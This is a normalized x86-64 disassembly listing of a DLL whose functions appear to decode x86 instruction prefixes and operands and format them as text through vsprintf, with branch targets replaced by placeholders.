sub_10001000
push rbx
sub rsp 0x20
xor edx edx
mov r8d 0x290
mov rbx rcx
call memset
mov [ rbx + 0xac ] 0x10
mov [ rbx + 0xc8 ] 0x224
mov [ rbx + 0xb0 ] 0x0
call [ __iob_func@IAT ]
lea rcx [ sub_10001790 ]
mov [ rbx ] rcx
mov [ rbx + 0x8 ] 0x0
mov [ rbx + 0x9 ] 0x0
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] 0x0
mov [ rbx + 0x30 ] 0x0
add rsp 0x20
pop rbx
retn
sub_10001060
push rbx
sub rsp 0x20
movzx eax [ rcx + 0x9 ]
mov rbx rcx
cmp [ rcx + 0x8 ] al
jne r-xdata
mov [ rcx + 0x48 ] 0x0
mov [ rcx + 0x68 ] 0x0
call sub_10003ec0
test eax eax
je r-xdata
cmp [ rcx + 0x30 ] 0x0
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov rax [ rbx + 0x38 ]
test rax rax
je r-xdata
movzx eax [ rbx + 0x18 ]
add rsp 0x20
pop rbx
retn
mov rcx rbx
call rax
sub_100010e0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbx
sub rsp 0x20
mov eax [ rcx + 0xa8 ]
mov rbx rcx
lea r8 [ rsp + 0x40 ]
lea rcx [ rax + rcx + 0x68 ]
call [ vsprintf@IAT ]
add [ rbx + 0xa8 ] eax
add rsp 0x20
pop rbx
retn
sub_10001120
push rbx
sub rsp 0x20
mov al [ rdx + 0x4 ]
mov rbx rcx
cmp al 0x8
je r-xdata
lea rdx [ r--data ]
cmp al 0x10
je r-xdata
cmp [ rbx + 0x13e ] 0x0
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_100010e0
lea rdx [ r--data ]
jmp r-xdata
cmp al 0x20
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
call sub_100010e0
lea rdx [ r--data ]
jmp r-xdata
cmp al 0x40
je r-xdata
lea rdx [ r--data ]
jmp r-xdata
cmp al 0x50
jne r-xdata
cmp [ rbx + 0x13d ] 0x0
je r-xdata
lea rdx [ r--data ]
jmp r-xdata
sub_100011b0
sub rsp 0x28
mov eax [ rdx ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x48 ] rdi
add eax 0xffffff74
mov rbx rdx
mov rdi rcx
cmp eax 0x5
ja r-xdata
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
mov [ rsp + 0x38 ] rbp
lea rbp [ __dos_header ]
cdqe
mov eax [ rbp + rax * 4 + 0x1574 ]
add rax rbp
jmp rax
movsxd rdx [ rdx + 0x10 ]
mov rdx [ rbp + rdx * 8 + 0x35128 ]
call sub_100010e0
mov rbp [ rsp + 0x38 ]
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
mov [ rsp + 0x40 ] rsi
xor esi esi
test r8d r8d
je r-xdata
test r8d r8d
je r-xdata
test r8d r8d
je r-xdata
mov al [ rdx + 0x4 ]
cmp al 0x20
je r-xdata
test r8d r8d
je r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_100010e0
movzx r11d [ rdi + 0x132 ]
test r11b r11b
je r-xdata
call sub_10001120
mov al [ rbx + 0x4 ]
cmp al 0x8
je r-xdata
call sub_10001120
mov al [ rbx + 0x4 ]
cmp al 0x8
je r-xdata
call sub_10001120
movzx r9d [ rdx + 0xc ]
movzx r8d [ rdx + 0x8 ]
lea rdx [ r--data ]
call sub_100010e0
mov rbp [ rsp + 0x38 ]
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
cmp al 0x30
jne r-xdata
lea rdx [ r--data ]
call sub_10001120
movsxd rax [ rbx + 0x10 ]
test eax eax
je r-xdata
movzx r8d r11b
lea rdx [ r--data ]
mov rcx rdi
mov r8 [ rbp + r8 * 8 + 0x35128 ]
call sub_100010e0
movzx r8d [ rbx + 0x8 ]
lea rdx [ r--data ]
jmp r-xdata
cmp al 0x10
je r-xdata
movsx r8 [ rbx + 0x8 ]
cmp al 0x10
je r-xdata
mov rbp [ rsp + 0x38 ]
movzx r8d [ rdx + 0x8 ]
mov r9d [ rdx + 0xc ]
lea rdx [ r--data ]
call sub_100010e0
mov rbp [ rsp + 0x38 ]
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
cmp [ rbx + 0x14 ] 0x0
mov [ rsp + 0x20 ] r12
lea r12 [ r--data ]
je r-xdata
mov r8 [ rbp + rax * 8 + 0x35128 ]
lea rdx [ r--data ]
mov rcx rdi
call sub_100010e0
mov esi 0x1
mov rcx rdi
call sub_100010e0
movzx r8d [ rbx + 0x8 ]
lea rdx [ r--data ]
jmp r-xdata
cmp al 0x20
je r-xdata
movsx r8 [ rbx + 0x8 ]
jmp r-xdata
cmp al 0x20
jne r-xdata
movzx eax [ rbx + 0x19 ]
test al al
je r-xdata
test esi esi
je r-xdata
lea rdx [ r--data ]
jmp r-xdata
cmp al 0x40
jne r-xdata
add r8 [ rdi + 0xb0 ]
lea rdx [ r--data ]
mov rcx rdi
call sub_100010e0
mov rbp [ rsp + 0x38 ]
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
movsxd r8 [ rbx + 0x8 ]
jmp r-xdata
movzx eax [ rbx + 0x18 ]
cmp al 0x8
jne r-xdata
lea rdx [ r--data ]
movzx r8d al
mov rcx rdi
call sub_100010e0
movsxd r8 [ rbx + 0x14 ]
lea rdx [ r--data ]
mov rcx rdi
mov r8 [ rbp + r8 * 8 + 0x35128 ]
call sub_100010e0
mov esi 0x1
mov rdx r12
mov rcx rdi
call sub_100010e0
mov r8d [ rbx + 0x8 ]
mov r8 [ rbx + 0x8 ]
lea rdx [ r--data ]
mov rcx rdi
call sub_100010e0
mov rbp [ rsp + 0x38 ]
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
cmp al 0x10
jne r-xdata
movzx eax [ rbx + 0x8 ]
test al al
jns r-xdata
cmp al 0x20
jne r-xdata
movzx r9d [ rbx + 0x8 ]
test esi esi
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rdi
cmovne r8 r12
call sub_100010e0
jmp r-xdata
test esi esi
lea r8 [ r--data ]
lea rdx [ r--data ]
movsx r9d al
mov rcx rdi
cmovne r8 r12
call sub_100010e0
jmp r-xdata
movsx r8d al
lea rdx [ r--data ]
mov rcx rdi
neg r8d
call sub_100010e0
jmp r-xdata
cmp al 0x40
jne r-xdata
cmp [ rdi + 0x13c ] 0x40
jne r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_100010e0
mov r12 [ rsp + 0x20 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
mov r9 [ rbx + 0x8 ]
test esi esi
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rdi
cmovne r8 r12
call sub_100010e0
mov r9d [ rbx + 0x8 ]
test esi esi
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rdi
cmovne r8 r12
call sub_100010e0
jmp r-xdata
mov r9d [ rbx + 0x8 ]
test r9d r9d
jns r-xdata
test esi esi
lea r8 [ r--data ]
lea rdx [ r--data ]
cmovne r8 r12
mov rcx rdi
call sub_100010e0
jmp r-xdata
neg r9d
lea rdx [ r--data ]
mov rcx rdi
mov r8d r9d
call sub_100010e0
jmp r-xdata
sub_10001590
sub rsp 0x28
mov rax [ rcx + 0x288 ]
mov [ rsp + 0x40 ] rbx
mov rbx rcx
bt [ rax + 0x1c ] 0x9
jb r-xdata
mov rax [ rbx + 0x288 ]
bt [ rax + 0x1c ] 0xa
jb r-xdata
cmp [ rcx + 0x133 ] 0x0
je r-xdata
cmp [ rbx + 0x135 ] 0x0
je r-xdata
cmp [ rbx + 0x134 ] 0x0
je r-xdata
mov al [ rcx + 0xac ]
cmp al 0x10
je r-xdata
cmp [ rbx + 0x136 ] 0x0
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
mov al [ rbx + 0xac ]
cmp al 0x10
je r-xdata
lea rdx [ r--data ]
call sub_100010e0
cmp al 0x20
je r-xdata
cmp [ rbx + 0x138 ] 0x0
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
cmp al 0x20
je r-xdata
lea rdx [ r--data ]
call sub_100010e0
jmp r-xdata
cmp al 0x40
jne r-xdata
cmp [ rbx + 0x13f ] 0x0
mov [ rsp + 0x48 ] rdi
lea rdi [ __dos_header ]
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
jmp r-xdata
cmp al 0x40
jne r-xdata
movsxd rax [ rbx + 0xc8 ]
cmp eax 0x225
jge r-xdata
movzx eax [ rbx + 0x132 ]
test al al
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
jmp r-xdata
xor r8d r8d
mov r8 [ rdi + rax * 8 + 0x1f3c0 ]
jmp r-xdata
movzx r8d al
lea rdx [ r--data ]
mov rcx rbx
mov r8 [ rdi + r8 * 8 + 0x35128 ]
call sub_100010e0
cmp [ rbx + 0xf0 ] 0x0
je r-xdata
movzx r8d [ rbx + 0x140 ]
mov rcx rbx
call sub_100011b0
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
lea rdx [ rbx + 0xd0 ]
cmp [ rdx ] 0x0
je r-xdata
cmp [ rbx + 0x110 ] 0x0
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
movzx r8d [ rbx + 0x141 ]
lea rdx [ rbx + 0xf0 ]
mov rcx rbx
call sub_100011b0
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
lea rdx [ r--data ]
mov rcx rbx
call sub_100010e0
movzx r8d [ rbx + 0x142 ]
lea rdx [ rbx + 0x110 ]
mov rcx rbx
call sub_100011b0
sub_100017d0
push rbx
sub rsp 0x20
movzx eax [ rcx + 0x8 ]
mov rbx rcx
cmp al [ rcx + 0x9 ]
je r-xdata
cmp [ rcx + 0x30 ] 0x0
jne r-xdata
add al 0x1
movzx eax al
mov [ rcx + 0x8 ] al
movzx eax [ rax + rcx + 0x143 ]
movzx ecx [ rcx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
add rsp 0x20
pop rbx
retn
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
add rsp 0x20
pop rbx
retn
sub_10001850
push rbx
sub rsp 0x20
movzx eax [ rcx + 0x8 ]
mov rbx rcx
cmp al [ rcx + 0x9 ]
je r-xdata
cmp [ rcx + 0x30 ] 0x0
jne r-xdata
add al 0x1
movzx eax al
mov [ rcx + 0x8 ] al
movzx eax [ rax + rcx + 0x143 ]
movzx ecx [ rcx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
cmp [ rbx + 0x130 ] 0x0
jne r-xdata
add rsp 0x20
pop rbx
retn
movzx ecx [ rbx + 0x18 ]
test cl cl
je r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x8 ] 0xff
sub cl 0x1
mov [ rbx + 0x18 ] cl
sub_100018f0
sub rsp 0x28
movzx eax [ rcx + 0x8 ]
mov [ rsp + 0x40 ] rbx
mov rbx rcx
cmp al [ rcx + 0x9 ]
je r-xdata
cmp [ rcx + 0x30 ] 0x0
jne r-xdata
add al 0x1
movzx eax al
mov [ rcx + 0x8 ] al
movzx eax [ rax + rcx + 0x143 ]
movzx ecx [ rcx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
mov [ rsp + 0x48 ] rdi
movzx edi al
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
mov rbx [ rsp + 0x40 ]
movzx eax al
mov cx di
mov rdi [ rsp + 0x48 ]
shl eax 0x8
or eax ecx
add rsp 0x28
retn
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
sub_100019f0
sub rsp 0x28
movzx eax [ rcx + 0x8 ]
mov [ rsp + 0x40 ] rbx
mov rbx rcx
cmp al [ rcx + 0x9 ]
je r-xdata
cmp [ rcx + 0x30 ] 0x0
jne r-xdata
add al 0x1
movzx eax al
mov [ rcx + 0x8 ] al
movzx eax [ rax + rcx + 0x143 ]
movzx ecx [ rcx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
mov [ rsp + 0x48 ] rdi
movzx edi al
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax al
shl eax 0x8
or edi eax
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax al
shl eax 0x10
or edi eax
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
mov rbx [ rsp + 0x40 ]
movzx eax al
shl eax 0x18
or eax edi
mov rdi [ rsp + 0x48 ]
add rsp 0x28
retn
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
sub_10001bd0
sub rsp 0x28
movzx eax [ rcx + 0x8 ]
mov [ rsp + 0x40 ] rbx
mov rbx rcx
cmp al [ rcx + 0x9 ]
je r-xdata
cmp [ rcx + 0x30 ] 0x0
jne r-xdata
add al 0x1
movzx eax al
mov [ rcx + 0x8 ] al
movzx eax [ rax + rcx + 0x143 ]
movzx ecx [ rcx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
mov [ rsp + 0x48 ] rdi
movzx edi al
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax al
shl rax 0x8
or rdi rax
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax al
shl rax 0x10
or rdi rax
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax al
shl rax 0x18
or rdi rax
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax al
shl rax 0x20
or rdi rax
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax al
shl rax 0x28
or rdi rax
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax al
shl rax 0x30
or rdi rax
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
mov rbx [ rsp + 0x40 ]
movzx eax al
shl rax 0x38
or rax rdi
mov rdi [ rsp + 0x48 ]
add rsp 0x28
retn
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
sub_10001f90
sub rsp 0x28
cmp [ rcx + 0x130 ] 0x0
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x40 ] rsi
mov esi 0x1
mov rbx rcx
je r-xdata
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x48 ] rdi
mov edi esi
lea rbp [ __dos_header ]
lea eax [ rsi - 0x2 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
cmp [ rbx + 0x30 ] 0x0
jne r-xdata
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
cmp [ rbx + 0x130 ] 0x0
movzx edx [ rbx + 0x18 ]
jne r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
mov eax 0xffffffff
cmp [ rbx + 0xac ] 0x40
movzx eax [ rbx + 0x8 ]
movzx ecx [ rax + rbx + 0x143 ]
jne r-xdata
movzx eax cl
add eax 0xffffffda
cmp eax 0xcd
ja r-xdata
movzx eax cl
and al 0xf0
cmp al 0x40
jne r-xdata
xor esi esi
cdqe
movzx eax [ rax + rbp + 0x22b4 ]
mov ecx [ rbp + rax * 4 + 0x2284 ]
add rcx rbp
jmp rcx
mov [ rbx + 0x131 ] cl
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
add edi 0x1
test esi esi
jne r-xdata
mov [ rbx + 0x132 ] 0x46
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
mov [ rbx + 0x132 ] 0x47
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
mov [ rbx + 0x132 ] 0x48
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
mov [ rbx + 0x132 ] 0x45
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
mov [ rbx + 0x132 ] 0x49
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
mov [ rbx + 0x132 ] 0x4a
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
mov [ rbx + 0x134 ] 0x67
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
mov [ rbx + 0x135 ] 0xf0
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
cmp [ rbx + 0x139 ] 0x0
jne r-xdata
mov [ rbx + 0x139 ] 0xf2
mov [ rbx + 0x138 ] 0xf2
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
mov [ rbx + 0x139 ] 0xf3
mov [ rbx + 0x136 ] 0xf3
mov [ rbx + 0x137 ] 0xf3
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
cmp edi 0xf
je r-xdata
test dl dl
je r-xdata
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
jmp r-xdata
mov [ rbx + 0x133 ] 0x66
mov [ rbx + 0x131 ] 0x0
jmp r-xdata
mov [ rbx + 0x139 ] 0x66
movzx eax [ rbx + 0xac ]
cmp al 0x40
jne r-xdata
add [ rbx + 0x8 ] 0xff
sub dl 0x1
mov [ rbx + 0x18 ] dl
cmp [ rbx + 0x130 ] 0x0
jne r-xdata
cmp al 0x20
jne r-xdata
test [ rbx + 0x131 ] 0x8
mov ecx 0x20
lea eax [ rcx + 0x20 ]
je r-xdata
cmp al 0x10
jne r-xdata
cmp [ rbx + 0x133 ] 0x0
mov ecx 0x20
mov edx 0x10
mov eax ecx
cmovne eax edx
cmp [ rbx + 0x134 ] 0x0
cmovne ecx edx
mov [ rbx + 0x13b ] al
xor eax eax
mov [ rbx + 0x13c ] cl
jmp r-xdata
cmp [ rbx + 0x133 ] 0x0
mov r8d ecx
mov edx 0x10
cmovne r8d edx
mov r8d eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ rbx + 0x133 ] 0x0
mov edx 0x10
mov ecx 0x20
mov eax edx
cmovne eax ecx
cmp [ rbx + 0x134 ] 0x0
cmovne edx ecx
mov [ rbx + 0x13b ] al
mov [ rbx + 0x13c ] dl
mov rbp [ rsp + 0x38 ]
